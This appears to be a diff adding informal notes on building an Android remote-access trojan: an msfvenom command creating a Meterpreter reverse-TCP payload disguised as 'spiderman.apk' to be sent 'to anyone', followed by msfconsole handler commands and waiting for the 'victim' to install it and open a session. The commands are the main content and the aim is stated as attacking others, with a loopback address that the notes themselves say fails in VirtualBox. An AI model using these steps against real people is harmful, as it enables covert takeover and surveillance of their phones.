@@ -1,0 +1,32 @@
+find ip address is kali
+sudo ifconfig
+
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 R > spiderman.apk
+ask for kali password
+It will create apk & send it to anyone
+
+sudo msfconsole
+it will create file wait for 5 second
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+
+show options
+
+
+IT DIDN'T WORK AS APP IS NOT INSTALLED
+set LHOST 127.0.0.1
+exploit
+
+
+we have to wait until victim install the application
+after installing
+
+METERPRETER SESSION 1 OPENED	
+help
+
+
+
+THIS ABOVE CODE WON'T WORK IN VIRTUALBOX BECAUSE IPADDRESS IS 127.0.0.1  
+you need to have a system to install kali linux
+
+
